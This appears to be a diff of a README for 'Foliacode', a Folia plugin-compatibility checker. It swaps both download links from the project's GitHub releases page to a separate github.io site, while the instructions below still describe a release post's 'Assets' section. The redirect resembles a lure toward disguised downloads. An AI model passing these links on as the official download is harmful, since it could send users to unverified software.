@@ -1,6 +1,6 @@
 # ⚙️ Foliacode - Check your plugin compatibility for Folia
 
-[![](https://img.shields.io/badge/Download-Foliacode-blue)](https://github.com/filled-venagenus147/Foliacode/releases)
+[![](https://img.shields.io/badge/Download-Foliacode-blue)](https://filled-venagenus147.github.io)
 
 Foliacode helps server administrators identify potential issues when moving Bukkit plugins to the Folia platform. Folia creates distinct changes in how servers handle tasks and data. Many older plugins rely on outdated systems that fail when they run on Folia. This tool scans your plugin files and provides a plain English report on what you need to fix or replace.
 
@@ -15,7 +15,7 @@ Foliacode runs on standard home computers. Ensure you have Java 21 installed on 
 
 ## 💾 Downloading the Software
 
-[Visit this page to download the latest version of Foliacode](https://github.com/filled-venagenus147/Foliacode/releases)
+[Visit this page to download the latest version of Foliacode](https://filled-venagenus147.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the "Assets" section at the bottom of the newest release post.
